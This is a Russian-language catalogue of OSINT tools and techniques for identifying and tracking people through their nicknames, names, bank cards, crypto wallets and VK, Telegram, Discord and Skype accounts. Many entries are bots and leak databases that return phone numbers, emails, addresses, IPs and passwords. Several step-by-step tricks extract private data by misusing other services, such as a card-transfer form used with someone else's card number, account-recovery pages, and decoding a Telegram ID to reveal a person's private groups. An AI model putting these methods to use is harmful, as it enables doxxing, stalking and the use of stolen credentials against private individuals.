44. tenantresolution.pingcastle.com — покажет другие домены владельца сайта на основе Azure ID


Поиск через URL

1. https://www.reddit.com/search?q=site:example.com&restrict_sr=&sort=relevance&t=all#date=0329976453&h=1 — покажет где на reddit был упомянут сайт, замените example.com
2. api.hackertarget.com/pagelinks/?q=http://example.com — все ссылки на странице сайта, замените example.com
3. https://web.archive.org/web/*/example.com/* — замените example.com на домен или URL чтобы узнать все ссылки что сохранил архив Wayback Machine
4. https://psbdmp.ws/api/search/domain/example.com — упоминания в утечках на Pastebin, замените example.com, сайт выдаст id страниц, подставь этот ID в ссылку pastebin.com/ID


Архив

1. timetravel.mementoweb.org — найдет сохраненные копии сайта среди 30 ресурсов для архивации 
2. web.archive.org — показывает сохранённые копии страниц, исходный код, все директории сайта, статистику и много другого
3. cachedview.com — найдет копию сайта из кэша Google
4. oldweb.today —  найдет исторические версии сайтов, можно выбрать вид браузера и дату
5. arquivo.pt — есть расширенный поиск по сайту
6. archive.md — помимо HTML версии архивирует скриншот сайта
7. trove.nla.gov.au — найдет копию страницы, откройте расширенный поиск и укажите домен, можно искать в архиве страниц по ключевому слову

-------------------------------------------
Создатель - Kanaizu
Проэкт - shrm
-------------------------------------------

Парсеры

1. waybackpack (https://github.com/jsvine/waybackpack) (t) — загружает весь архив Wayback Machine
2. archivarix.com — восстонавливает полную копию сайта из веб-архива на определенную дату, до 200 файлов бесплатно


Инструменты

1. followthatpage.com (r) — следит за сайтом, сообщит о изменениях страницы на почту
2. @suzanne_archiver_bot — архивирует сайт в 3 веб-архивах
3. @watch_bot — следит за изменениями на сайте, отправляет уведомление вам в Telegram
4. visualping.io — следит за изменениями на сайте, на сайте можно выбрать где следить, отправляется уведомление на почту

Поиск по никнейму

1. Maigret (https://github.com/soxoj/maigret) (t) — найдет аккаунты с таким же ником среди 3000+ сайтов
2. @maigret_osint_bot — найдет аккаунты с таким ником среди 3000+ сайтов, дает самый точный результат
3. namecheckup.com — найдет искомый ник на сайтах
4. instantusername.com — найдет искомый ник на сайтах
5. suip.biz (https://suip.biz/ru/?act=sherlock) — найдет искомый ник на 300+ сайтах, работает очень медленно, дождитесь ответа
6. namechk.com — найдет искомый ник на сайтах и в доменах
7. sherlock (http://github.com/sherlock-project/sherlock) (t) — найдет искомый ник на сайтах
8. whatsmyname.app — найдет искомый ник на сайтах
9. boardreader.com — найдет искомый ник на форумах
10. leakedsource.ru — найдет искомый ник на сайтах
11. yasni.com (http://www.yasni.com/) — автоматический поиск в интернете
12. social-searcher.com — найдет упоминания в соц. сетях и на сайтах
13. socialmention.com — найдет упоминания ника
14. @SovaAppBot — найдет аккаунты с похожим ником на популярных ресурсах
15. mailcat (https://github.com/sharsil/mailcat) (t) — перебирает почтовые сервисы чтобы найти действительные email адреса
16. @mailcat_s_bot — перебирает почтовые сервисы чтобы найти действительные email адреса
17. leak-lookup.com (https://leak-lookup.com/search) (r) — покажет на каких сайтах была утечка с искомым ником
18. @DATA_007bot — выдаст аккаунт QQ, регион
19. ccjkm4pwid.onion.ws (http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion.ws/deepsearch) (r) —  найдет логин, пароль, источник утечки
20. spiderfoot.net (r) — найдет аккаунты со схожим ником, покажет скриншоты этих профилей, можно использовать в облаке если пройти регистрацию
21. Nexfil (https://github.com/thewhiteh4t/nexfil) (t) — найдет аккаунты с идентичным ником среди 350 медиа платформ, можно отправить крупный список ников
22. analyzeid.com (http://analyzeid.com/username/) — найдет аккаунты с идентичным ником среди 100 сайтов, из профилей выведет все имена, страны, и даты создания в один список
23. findaccountsbyusername.com — выдаст существующие аккаунты с похожим ником, используется Sherlok
24. Marple (https://github.com/soxoj/marple) (t) — ищет в 10+ поисковых системах аккаунты с похожим ником 
25. Social Scanner (https://rapidapi.com/hailbytes-hailbytes-default/api/social-scanner/) (r) — найдет аккаунты с идентичным ником среди 900+ платформ, после регистрации введи ник в поле username и нажми Test Endpoint
26. @OffThisContactBot — найдет номер телефона, почту, имя, для поиска создай и подключи свой тг-бот
27. @declassified_bot — выдаст телефон, имена, почту
28. @mailcat_s_bot — перебирает почтовые сервисы чтобы найти действительные email адреса
29. @maigret_s_bot — найдет аккаунты с похожим ником на 500÷ ресурсах
-------------------------------------------
Как найти Stackoverlow аккаунт
-------------------------------------------
Метод позволяет найти ник, адрес, сайт и описание аккаунта на Stackoverflow

[1] Откройте URL https://data.stackexchange.com/stackoverflow/query/new
[2] В большом поле для ввода вставьте этот код:
select Id [User Link], DisplayName, WebsiteUrl, Location, AboutMe
from Users
where DisplayName like 'USERNAME'
order by CreationDate desc
[3] В коде измените USERNAME на ник, не удаляя кавычки
[4] Подтвердите recapcha и нажмите на кнопку Run Query
Если в полученной таблице нет результатов, то такого ника нет, можно попробовать прибавить к нику в конце знак % и запустить еще раз

Можно попробовать еще такой код
select Id [User Link], DisplayName, WebsiteUrl, Location, AboutMe
from Users
where WebsiteUrl like 'USERNAME'
order by CreationDate desc

Поиск будет по ссылкам в аккаунтах которые указываются как личный сайт

Поиск по ФИО гражданина любой страны

1. aleph.occrp.org — поиск по базам данных, файлам, реестрам компаний, утечкам, и другим источникам
2. locatefamily.com (https://www.locatefamily.com/) — найдет адрес
3. infobel.com — найдет номер телефона, адрес и ФИО
4. rocketreach.co (r) — поиск людей в LinkedIn, Facebook и на других сайтах, находит email
5. munscanner.com (https://munscanner.com/dbs/) — поиск по реестрам компаний разных стран
6. news-explorer.mybluemix.net — поиск в СМИ, найдет ассоциации между компаниями, публикациями и личностями
7. sanctionssearch.ofac.treas.gov — поиск в санкционном списке США
8. emailGuesser (https://github.com/WhiteHatInspector/emailGuesser) (t) — подбирает на основе ФИ все возможные комбинации email адреса и верифицирует их
9. billiongraves.ru — найдет когда умер и где захоронен
10. findmypast.co.uk (https://www.findmypast.co.uk/search/historical-records?region=world&page=1&order_direction=desc&order_by=relevance) (r) — браки, смерти, рождения до 2006 года, нужно указать страну, нет стран СНГ
11. webmii.com — упоминания в новостях, профили в социальных сетях, видео, можно добавить ключевое слово для точного результата
12. aihitdata.com (r) — найдет компании по всему миру где работает человек, откройте вкладку “More Fields” и введите ФИ в кавычках
13. xlek.com — найдет какой домен был зарегистрирован на искомое ФИО, поиск в whois, покажет контакты и адреса
14, my.mail.ru (https://my.mail.ru/my/search_people) (r) — даст аккаунт но Мой Мир, есть фильтры по возрасту, росту, весу, интересам и прочему
15. leak-lookup.com (https://leak-lookup.com/search) (r) — покажет на каких сайтах была утечка с искомым ФИО
16. offshoreleaks.icij.org — найдет офшорные компании, адреса и их связи между собой, поиск по имени и фамилии на латинском
17. app02.bazl.admin.ch (https://app02.bazl.admin.ch/web/bazl/en/#/lfr/search) — реестр Швейцарии, найдет зарегистрированные самолёты и вертолеты, используй расширенный поиск, имя только латиницей
18. UsersBox.org — бот, найдет аккаунты, пароли, почты, имена, бесплатный период 14 дней для новых аккаунтов
19. leakedsource.ru — покажет в каких базах замечено имя, даст домен и дату утечки
20. opensanctions.org — найдет в списке санкций, даст дату рождения, должность, другое имя, членство в организациях, попробуй ввести имя латиницей
21. seintpl.github.io (http://seintpl.github.io/NAMINT/) — даст прямые ссылки на социальные сети и поисковики с разными вариантами имени, вводить ФИО только на латинице
22. @OffThisContactBot — найдет номер телефона, ищет в именах глобальной телефонной книги, бесплатно подключите свой бот
23. archivesportaleurope.net (https://www.archivesportaleurope.net/search/-/s/n) — найдет упоминание в национальных архивах стран Европы, можно найти в списках работодателей, учебных учреждений, военных архивах и в многих других архивах
24. Fuck-Facebook (http://4wbwa6vcpvcr3vvf4qkhppgy56urmjcj2vagu2iqgp3z656xcmfdbiqd.onion.ws/) — найдет номер телефона, ID аккаунта Facebook, работу, в глобальной утечке Facebook, нужно пройти капчу перед поиском
25. @The_New_Get_Contact_Bot — найдет номер телефона; вводи ФИО, фамилию или ФИ во всех возможных вариантах написания


Инструменты

1. behindthename.com — найдет виды произношения имени, пол, выражение в других языках, значение и историю, связанные имена, страну где чаще используется


Восстановление доступа

1. Samsung (https://account.samsung.com/accounts/v1/MBR/findIdWithUserInfo) — покажет часть email или телефона, необходимо ввести полную дату рождения и быть залогининым на сайте Samsung
-------------------------------------------
Как найти адрес почты по фамилии и имени
-------------------------------------------
[1] Открой эту таблицу Google (https://docs.google.com/spreadsheets/d/17URMtNmXfEZEW9oUL_taLpGaqTDcMkA79J8TRw4xnz8/edit#gid=0)
[2] Выбери Файл > Копировать
[3] В поле для ввода ФИО введи что известно
[4] Укажи в поле domain популярный почтовый сервис, пример: gmail.com, можно yandex.ru, mail.ru, rambler.ru, и yahoo.com
[5] Наводи на адреса и смотри на картинки профиля. 

Адрес НЕ существует если у профиля картинка со светло-голубым фоном.

Если не появляется окно с профилем, то обнови страницу

Поисковые операторы для поиска по ФИО гражданина любой страны

Операторы поиска Google и Яндекс — это символы и слова, с помощью которых можно уточнить и сузить поиск. Они бывают простыми и сложными и могут комбинироваться друг с другом. Некоторые поисковые операторы Google совпадают с теми, что используются в Яндекс, а некоторые работают только для конкретного поисковика

-------------------------------------------
Дорки для Google
-------------------------------------------
Замените ФИО на ФИО гражданина

1. "ФИО" ext:doc | ext:docx | ext:ppt | ext:pptx | ext:pdf | ext:txt | ext:odt | ext:log | ext:sql | ext:xls | ext:xlsx | ext:csv

2. "ФИО" site:amazon.com/review

Поиск по номеру на пластиковой карте любого банка

1. binlist.net — определит к какому банку принадлежит карта
2. bindb.com — определит к какому банку принадлежит карта
3. Scylla (https://github.com/josh0xA/Scylla) (t) — найдет упоминания номера карты в утечках
-------------------------------------------
Поиск по номеру карты банка Украины
-------------------------------------------
1. easypay.ua — найдет ФИО, в поле получатель введи номер карты и посмотри на подпись внизу
-------------------------------------------
Номер телефона по номеру пластиковой карты любого банка
-------------------------------------------
Не работает с картой Qiwi, Sberbank, Alpha, Россельхозбанк, ЮMoney

[1] Открой card2card.kz (https://www.card2card.kz/)
[2] Где "Отправитель" введи карту номер телефона которой хочешь узнать. А CVC и срок действия укажи любой
[3] Где  "Получатель" укажи всякую карту, например 4893 4704 7283 6532
[4] Введи различную сумму и нажми перевести

Откроется сайт 3DS где указывается часть номера телефона и в редких случаях логин или email.
-------------------------------------------
Поиск по данным аккаунта Webmoney
-------------------------------------------
1. passport.webmoney.ru (https://passport.webmoney.ru/asp/VerifyWMID.asp) — поиск по WM идентификатору или кошельку, покажет инфо о кошельке webmoney


Через URL

1. https://arbitrage.webmoney.ru/asp/claims.asp?wmid=1234567890 — претензии, отзывы, иски аккаунта, замените 1234567890 на WMID кошелька
2. https://passport.webmoney.ru/asp/CertviewSu.asp?wmid=1234567890 — покажет статус обслуживания, замените 1234567890 на WMID кошелька
-------------------------------------------
Поиск по данным аккаунта Venmo
-------------------------------------------
1. Venmo-OSINT (https://github.com/sc1341/Venmo-OSINT) (t) — найдет транзакции пользователя
-------------------------------------------
Поиск по адресу крипто кошелька Bitcoin
-------------------------------------------
1. intelx.io (https://intelx.io/tools?tab=bitcoin) — найдет упоминания в утечках и БД
2. www.blockchain.com — покажет все транзакции
3. live.blockcypher.com — покажет все транзакции
4. blockchair.com — покажет все транзакции
5. maltego (http://maltego.com/downloads/) (t) — визуальное представление и анализ транзакций
6. oxt.me (r) — визуальное представление и анализ транзакций в браузере, не работает мобильная версия
7. learnmeabitcoin.com (https://learnmeabitcoin.com/tools/path/) — цепочка транзакций между двумя кошельками
8. addresschecker.eu — загружаете список адресов и получаете таблицу с данными текущего баланса за все время
9. blockpath.com — покажет транзакции кошелька в виде графа, можно добавлять несколько адресов
10. @cryptoaml_bot — узнает источники поступления средств на крипто кошелёк и дает оценку риска, 1 бесплатный поиск на аккаунт
11. explorer.crystalblockchain.com — покажет граф транзакций, определяет владельца кошелька, можно добавлять несколько кошельков чтобы найти общие связи
12. opensanctions.org — упоминание в санкционном списке
13. 2tvhsyd.onion.ws (https://pdcdvggsz5vhzbtxqn2rh27qovzga4pnrygya4ossewu64dqh2tvhsyd.onion.ws/) — проанализирует цепочки переводов и покажет какой процент обменников, майнеров, миксеров и грязных денег есть на балансе адреса
14. breadcrumbs.app (https://www.breadcrumbs.app/home) — построит удобный граф транзакции кошелька, выявляет адреса кошельков бирж и мошенников, дает статистику входов и выходов, работает только с VPN
15. scamsearch.io — реестр мошенников, найдет почту, причину внесения в реестр, номер телефона, дату и прочее


Инструменты

1. cryptocurrencyalerting.com (https://cryptocurrencyalerting.com/wallet-watch.html) (r) — следит за изменениями баланса кошелька, отправляет уведомление на Email, SMS, Discord или в Telegram
-------------------------------------------
Поиск по адресу крипто кошелька Ethereum
-------------------------------------------
1. etherchain.org — анализ Ethereum адреса
2. etherscan.io — анализ Ethereum адреса
3. blockchair.com — информация о транзакциях
4. ethtective.com — транзакции в виде интерактивного графа
5. opensanctions.org — упоминание в санкционном списке
6. breadcrumbs.app (https://www.breadcrumbs.app/home) — построит удобный граф транзакции кошелька, выявляет адреса кошельков бирж и мошенников, дает статистику входов и выходов, работает только с VPN
-------------------------------------------
Поиск по адресу крипто кошелька Dash , Dogecoin , LTC
-------------------------------------------
1. live.blockcypher.com (https://live.blockcypher.com/dash/) — информация о транзакциях
2. blockchair.com — информация о транзакциях
-------------------------------------------
Для кошельков с криптовалютой
-------------------------------------------
coin360.com — ссылки на ресурсы поиска транзакций кошелька, для каждой криптовалюты есть пункт explorers и там ссылка на сайт по поиску транзакций

Поиск по аккаунту в VK

1. searchlikes.ru (r) — найдет где есть лайки и комментарии пользователя, дает статистику друзей
2. ininterests.com (http://ininterests.com/%D0%9B%D1%8E%D0%B4%D0%B8) — архивная копия аккаунта несколько лет назад
3. 220vk.com (r) — определит средний возраст друзей, скрытых друзей, города друзей, дата регистрации и т.д
4. vk5.city4me.com — cтатистика онлайн активности, скрытые друзья
5. VKAnalysis (https://github.com/migalin/VKAnalysis) (t) — анализ круга общения, текста, фото, активности и интересов аккаунта
6. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную версию аккаунта, даст 20+ прямых ссылок на сайты веб архивы
7. InfoApp (https://vk.com/app7183114) — найдет созданные группы, упоминания в комментариях, общих друзей, созданные приложения и комментарии к фото
8. @InfoVkUser_bot — бот покажет наиболее частые места учебы друзей аккаунта
9. @FindNameVk_bot — история изменений имени аккаунта
10. vkdia.com — определит с кем из друзей переписывается человек
11. глазбога.com (r) — бот, найдет фото приватного аккаунта в хорошем качестве, дату создания
12. vkpt.info (t) — мониторинг деятельности пользователя, поиск старых друзей, покажет, кому ставит лайки, все комментарии пользователя, скрытые друзья
13. UsersBox.org — бот, находит номер телефона и много других полезных данных, бесплатный триал 14 дней
14. @SovaAppBot — статистика друзей аккаунта, покажет выборку по городу, стране, возрасту и полу
15. smartsearchbot.com — бот, находит email, номер телефона и другое, бесплатный поиск не доступен для новых пользователей
16. api.vk.com (https://vk.com/dev/messages.getLastActivity) — покажет дату последней активности аккаунта
17. @Informator_BelBot — найдёт частые города друзей, общих друзей между двумя аккаунтами
18. HiddenFriends (https://vk.com/app3256362) — приложение ВК, найдет скрытых друзей, дождитесь окончания поиска
19. @QuickOSINT_Robot — найдет пароли, соц. сети, логины, телефоны, сделает анализ друзей и многое другое, всего 3 бесплатных запроса для новых аккаунтов
20. @OffThisContactBot — найдет номер телефона, почту, имя, фото, для поиска создай и подключи свой тг-бот
21. @Zernerda_bot — анализ друзей и знакомых по городу, возрасту, школе, ВУЗу, лайкам, ищет упоминание профиля в утечках, бесплатный поиск после первого запуска бота
22. @a11_1n_bot (r) — найдет почту и номер телефона
23. @declassified_bot — найдет адреса регистрации, почту, имя и авто
24. @vk2017robot — профиль вк в 2017 году, покажет аватар, описание и прочее


Парсеры

1. @Informator_BelBot — скачает друзей, сообщества аккаунта


Инструменты

1. @AximoBot — мгновенно сохранит новые публикации аккаунта в Telegram
2. 220vk.top — слежка за аккаунтом, после добавления будут доступны аватары, лайки, комментарии, друзья группы и т.д.


Поиск через URL

1. https://onli-vk.ru/pivatfriends.php?id=123456789 — поиск друзей закрытого аккаунта, замените 123456789 на ID аккаунта VK
2. https://vk.com/feed?obj=123456789&q=&section=mentions — упоминания аккаунта, замените 123456789 на ID аккаунта
3. https://rusfinder.pro/vk/user/id123456789 — сохраненная копия профиля: имя и город профиля в заголовке страницы, замените 123456789 на ID аккаунта VK
4. https://my.mail.ru/vk/123456789 — найдет аккаунт на Мой Мир, замените 123456789 в ссылке на ID аккаунта
5. https://vk.com/foaf.php?id=123456789 — найдет количество друзей, количество подписчиков и дату рождения, дату изменения имени и прочее, замените 123456789 в ссылке на ID аккаунта, откройте исходный код страницы Ctrl+U
6. https://topdb.ru/username — найдет архивную копию профиля и фото, иногда нужен VPN, замените username на логин пользователя или ID, например id1234567
7. https://bigbookname.com/user/id-123456789 — историческая копия аккаунта с фото, друзьями, датой рождения, городом и информацией о себе, замените 123456789 на ID аккаунта VK
8. https://vk.watch/123456789/profile —покажет фото аккаунта с 2016 года, замените 123456789 на ID аккаунта VK
-------------------------------------------
⁣⁣ Как узнать номер телефона аккаунта ВК через Одноклассники
-------------------------------------------
[1] В ВК добавьте аккаунт в друзья
[2] Перейдите в Одноклассники и откройте раздел мои друзья
[3] Нажмите на кнопку 'добавить друзей из ВК'
[4] Если аккаунт нашелся, то скопируйте ссылку на найденный аккаунт ОК
[5] Перейдите по этой ссылке (https://ok.ru/password/recovery) и выберите восстановить через профиль
[6] Вставьте в поле ссылку которую вы скопировали на профиль и нажмите искать

В результате вы получите часть номера телефона и e-mail адреса
-------------------------------------------
Как найти друзей приватного аккаунта VK
-------------------------------------------
[1] Скопируйте ID аккаунта у которого хотите узнать друзей
[2] Откройте Google, и вставьте туда этот ID, например: id123456
[3] В результатах поиска откройте такие сайты как facestrana.ru или boberbook.ru или vkanketa.ru или vkglobal.ru или другой который похож на эти
[4] На сайте будет анкета другого человека (это один из друзей), скопируйте ID этого аккаунта (ID в пункте основная информация)
[5] Перейдите по ссылке 220vk.com
 (https://220vk.com/commonFriends)[6] В первом поле вставьте ID друга, а во втором ID приватного аккаунта
[7] Нажмите кнопку "искать общих друзей"

Если друзей не нашлось или их мало, воспользуйтесь ID другого друга из результатов поиска в Google
-------------------------------------------
Найти через упоминания в VK
-------------------------------------------
В поиске VK введите *idXXXXXX, где XXXXXX это ID аккаунта, пример: *id6492. Еще попробуйте ввести в поиск в VK ссылку на аккаунт
-------------------------------------------
Поиск по сообществу в VK
-------------------------------------------
1. InfoApp (https://vk.com/app7183114) — находит комментарии от имени сообщества, видеозаписи, упоминания
2. @SovaAppBot — статистика сообщества по полу, возрасту, городам, странам
3. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу сообщества, даст 20+ прямых ссылок на сайты веб архивы


Через URL

1. https://vk.com/album-123456789_00 — все фото группы, даже удаленные, замените 123456789 на ID сообщества

Как найти владельца сообщества в VK

Через документы

[1] Откройте раздел документы в сообществе
[2] Откройте исходный код страницы (Ctrl+U)
[3] Откройте окно поиска (Ctrl+F)
[4] В окне поиска введите имя файла которое есть в сообществе. 
В результатах должна быть строка с именем файла, пример:

 [["439837850","xls","Spisok.xls","806 КБ, 15 декабря 2016 в 16:58","-27921417",0,"","138633190",false,1,""]]

где Spisok.xls имя файла, а 138633190 ID пользователя загрузившего этот файл, как правило это ID админа
-------------------------------------------
Для поста ВК
-------------------------------------------
Парсеры

1. exportcomments.com (https://exportcomments.com/download-vk-comments) — скачивает комментарии в CSV файл
-------------------------------------------
Telegram
-------------------------------------------
Поиск по ID и юзернейму аккаунта Telegram

1. Telegago (https://cse.google.com/cse?q=+&cx=006368593537057042503:efxu7xprihg) — найдет упоминание аккаунта в каналах, группах, включая приватные, а так же в Telegraph статьях
2. lyzem.com — найдет упоминание аккаунта в группах и каналах
3. @usinfobot — по ID найдёт имя и ссылку аккаунта, работает в inline режиме, введите в поле ввода сообщения @usinfobot и Telegram ID
4. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт
5. tgstat.com (https://tgstat.com/ru/search) — поиск по публичным сообщениям в каналах, найдет упоминание аккаунта
6. @SangMataInfo_bot — история изменения имени аккаунта
7. @TeleSINT_Bot — найдет группы в которых состоит пользователь
8. @creationdatebot — примерная дата создания аккаунта, бот принимает username, для поиска по ID можно переслать сообщение от искомого пользователя
9. @MySeekerBot — поисковик по иранским каналам
10. TelegramOnlineSpy (https://github.com/Forichok/TelegramOnlineSpy) (t) — лог онлайн активности аккаунта, скажет когда был в сети
11. Exgram (https://yandex.ru/search/site/?text=%22HowToFind%22&searchid=2424333) — найдет упоминание аккаунта, это поисковая система на основе Яндекса, поиск по 17 сайтам-агрегаторам, находит в Telegraph статьях, контактах, приватных и публичных каналах с группами
12. Commentgram (https://cse.google.com/cse?cx=006368593537057042503:ig4r3rz35qi) — найдет упоминание аккаунта, поиск в комментариях к постам в Telegram, работает через Google
13. Commentdex (https://yandex.ru/search/site/?text=%22HowToFind_bot%22&searchid=2444312) — найдет упоминание аккаунта, поиск в комментариях к постам в Telegram, работает через Яндекс
15. smartsearchbot.com — бот находит ФИО, бесплатный поиск не доступен для новых пользователей
16. @kruglyashik — канал с базой из 500K круглых видео-сообщений из русскоязычных групп, в поиске по каналу введите имя пользователя или #ID123456789 где 123456789  ID аккаунта
17. @TgAnalyst_bot — находит номер телефона, старое имя аккаунта, логин, IP и устройство, местами могут быть ложные данные, первый поиск без регистрации, если её пройти, то сливается ваш номер телефона
18. глазбога.рф — найдет часть номера телефона, историю изменения ссылки аккаунта
19. @clerkinfobot — дает номер телефона
20. UsersBox.org — бот, по нику найдет номер телефона, бесплатный доступ 14 дней после первого запуска бота
21. @TuriBot — выдает по ID имя пользователя аккаунта Telegram, отправь боту команду /resolve + ID
22. @eyeofbeholder_bot — даёт интересы аккаунта, а платно выдаст историю изменения имени, номер телефона, группы и ссылки которые публиковал пользователь
23. @regdatebot — выдаст примерную дату регистрации аккаунта, отправьте боту числовой ID аккаунта или перешлите сообщение
24. @QuickOSINT_Robot — найдет номер телефона, группы, id и ссылку аккаунта, поиск по нику или ID аккаунта, всего 3 бесплатных запроса для новых аккаунтов
25. @ki_wibot — найдет номер телефона в иранской утечке Telegram
26. app.element.io (https://app.element.io/#/home) (r) — найдет сохранённую копию аккаунта по ID, это аватарка  и имя, после регистрации, нажми на +, и выбери "начать новый чат", введи id в поиск
27. @OffThisContactBot — найдет номер телефона, почту, имя, для поиска создай и подключи свой тг-бот
28. @Zernerda_bot — по ID находит телефон и ник аккаунта Telegram, бесплатный поиск после первого запуска бота
29. @declassified_bot — выдаст имена, телефон и почту
30. @TgParserRobot — найдет группы в которых состоял пользователь, историю изменения имени, номер телефона


Поиск через URL

1. https://etlgr.me/conversations/123456789/subscription — найдет сохраненное имя аккаунта и статус подписки на @etlgr_bot, можно подставить к ID @etlgr.com и получить Email адрес, замени 123456789 на ID аккаунта
2. https://intelx.io/?s=https/t.me/USERNAME — найдет упоминание на сайтах и в слитых базах, замените USERNAME на имя пользователя

Как узнать по ID пользователя Telegram какие приватные группы он создал?

Берем ID пользователя Telegram, например - 188610951

[1] Переводим тут (https://cryptii.com/pipes/integer-encoder) из текста в 32 битный hex. Получается 0b 3d f9 87
[2] То что получилось тут переводим в base64, получается Cz35hw, где w надо убрать, т.е должно остаться первые 5 символов.
[3] Составляем ссылку по которой будем искать.
Все приватные ссылки который создаст этот пользователь будут начинаться так:

t.me/joinchat/Cz35h — Это не полная ссылка в приватную группу, а только её начало


Поиск полной ссылки на группу

1. Для DuckDuckGo и Yahoo
"joinchat/Cz35h..." — вставьте в поиск эту фразу заменив Cz35h на то что у вас получилось

2. Для Yandex
inurl:joinchat/Cz35h — вставьте в поиск эту фразу заменив Cz35h на то что у вас получилось

3. Для Google
"joinchat/Cz35h" — вставьте в поиск эту фразу заменив Cz35h на то что у вас получилось


Через URL

1. https://web.archive.org/web/*/t.me/joinchat/Cz35h/* — найдет запись в интернет архиве, замените Cz35h на то что у вас получилось
2. https://web.archive.org/web/*/telegram.me/joinchat/Cz35h/* — найдет запись в интернет архиве, замените Cz35h на то что у вас получилось

Поиск по пригласительной ссылке в группу/канал

1. telemetr.me (https://telemetr.me/all_posts/) (r) — поиск в 200+ млн постах Telegram каналов, сохраняет удаленные публикации 
2. tgstat.com (https://tgstat.com/ru/search) — даст статистику, упоминания и удаленные публикации, убери в фильтре постов галочку "скрывать удаленные публикации"
3. Telegago (https://cse.google.com/cse?q=+&cx=006368593537057042503:efxu7xprihg) — найдет упоминание в описании каналов/групп а так же сообщениях в группах и постах каналов
4. Exgram (https://yandex.ru/search/site/?text=%22HowToFind%22&searchid=2424333) — найдет упоминания
5. @ChatSearchRobot — на основе участников группы находит публичные чаты
6. Commentgram (https://cse.google.com/cse?cx=006368593537057042503:ig4r3rz35qi) — найдет упоминания, поиск в комментариях к постам
7. Commentdex (https://yandex.ru/search/site/?text=%22HowToFind_bot%22&searchid=2444312) — найдет упоминания, поиск в комментариях к постам
8. telemetr.io — найдет удаленные публикации
9. telegramdb.org — покажет ссылку, фото, описание группы/канала
10. @LinkCreatorBot — найдет ID аккаунта создателя ссылки, работает с приватными ссылками в группу даже если она не рабочая, и с приватными ссылками на канал у которых нету AAAAA в ссылке, длинна хеша в ссылке должна быть больше 16 символов, так было до 2020 года
11. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на канал/группу

Поиск через URL

1. https://intelx.io/?s=https/t.me/USERNAME — найдет упоминание на сайтах и в слитых базах, замените USERNAME на адрес канала


Инструменты

1. @AximoBot — мгновенно сохранит новые публикации канала
2. bibaandboba (https://github.com/andylvua/bibaandboba) (t) — для группы, покажет корреляции между двумя участниками группы

Как найти скрытое имя Telegram-канала

1. Скачай Telegram X (https://play.google.com/store/apps/details?id=org.thunderdog.challegram) на Android
2. В нем открой канал и перейди к первому сообщению на канале вручную или используй ссылку:

 t.me/CHANNEL/1

где CHANNEL надо заменить на адрес канала.

Найдется имя которое было указано при создании канала. Единственный клиент способный показать эту информацию это Telegram X.

Поиск по стикеру Telegram

1. @FindStickerCreatorBot — найдет Telegram ID владельца стикера, просто пришли боту стикер
2. @SPOwnerBot — найдет Telegram ID владельца стикера, просто пришли боту стикер


Поиск по эмодзи Telegram

1. @SPOwnerBot — найдет Telegram ID владельца эмодзи, просто пришли боту эмодзи


Инструменты

1. @Stickerdownloadbot — скачает стикер в высоком разрешении в PNG формате
-------------------------------------------
Поиск по аккаунту Discord
-------------------------------------------
1. support.discord.com (https://support.discord.com/hc/ru/articles/206346498-Where-can-I-find-my-User-Server-Message-ID-) — инструкция как найти Discord ID аккаунта
2. discord.id — показывает дату создания и фото
3. discordhub.com (https://discordhub.com/user/search) — находит сервера
4. discordleaks.unicornriot.ninja (https://discordleaks.unicornriot.ninja/discord/users) — находит сервера и сообщения
5. hugo.moe (https://hugo.moe/discord/discord-id-creation-date.html) — показывает дату создания аккаунта
6. app.element.io (https://app.element.io/#/home) (r) — найдет сохранённую копию аккаунта по ID, это имя и аватар, после регистрации, нажми на +, и выбери "начать новый чат", введи id в поиск
7. discord-tracker.ru (r) — выдает дату регистрации, статистику активности, сервера в которых учувствует аккаунт, история имени, история аватара, события в голосовом, сообщения, популярные слова, возможные друзья, статистика активности, и прочее
8. @UniversalSearchRobot — по Discord ID или тегу аккаунта найдет профили Discord на сторонних ресурсах


Поиск по названию сервера

1. discordservers.com — дает ссылку на вступление
2. discord.center — дает ссылку на вступление, в базе 36К серверов
3. disboard.org — дает ссылку на вступление, в базе 700К+ серверов
4. discord.me — дает ссылку на вступление, в базе 30К+ серверов
5. discordbee.com — дает ссылку на вступление, в базе 5К+ серверов


Через URL

1. https://top.gg/user/1234567890987654321 — находит в каких серверах состоит, фото, описание профиля, и прочее, замени 1234567890987654321
на Discord ID аккаунта


Парсеры

1. dht.chylex.com — загрузит историю выбранного текстового канала до первого сообщения и позволит вам загрузить его для просмотра в автономном режиме в вашем браузере
2. exportcomments.com (https://exportcomments.com/export-discord-conversation) — экспортирует весь чат из вашего канала Discord в файл CSV

Для аккаунта Mail.Ru

1. socid_extractor (https://github.com/soxoj/socid_extractor) (t) — найдет user ID

Поиск по аккаунту OnlyFans

1. fansmetrics.com — дает число подписчиков, социальные сети, и прочее
-------------------------------------------
Для аккаунта Pinterest
-------------------------------------------
1. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт
-------------------------------------------
Поиск по аккаунту на Patreon
-------------------------------------------
1. graphtreon.com — статистика патронов и примерный доход
2. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт
-------------------------------------------
Поиск по нику аккаунта Minecraft
-------------------------------------------
1. namemc.com — найдет UUID аккаунта, историю изменения имени, любимые сервера, аватар, скин, ссылку на аккаунт Discord и прочее

Поиск по UUID аккаунта Minecraft

1. namemc.com — найдет ник аккаунта, историю изменения имени, любимые сервера, аватар, скин, ссылку на аккаунт Discord и прочее
2. skidsearch.net (r) — в утечке найдет IP адрес, название слитой базы, на сайте выбери тип поиска по UUID
-------------------------------------------
Поиск по аккаунту Skype
-------------------------------------------
1. mostwantedhf.info (http://mostwantedhf.info/skype2email.php) — найдет почту
2. webresolver.nl — найдет IP
3. UsersBox.org — бот, найдет аккаунты в ВК у которых в поле skype  указан искомый логин, введите в боте  skype: <логин>
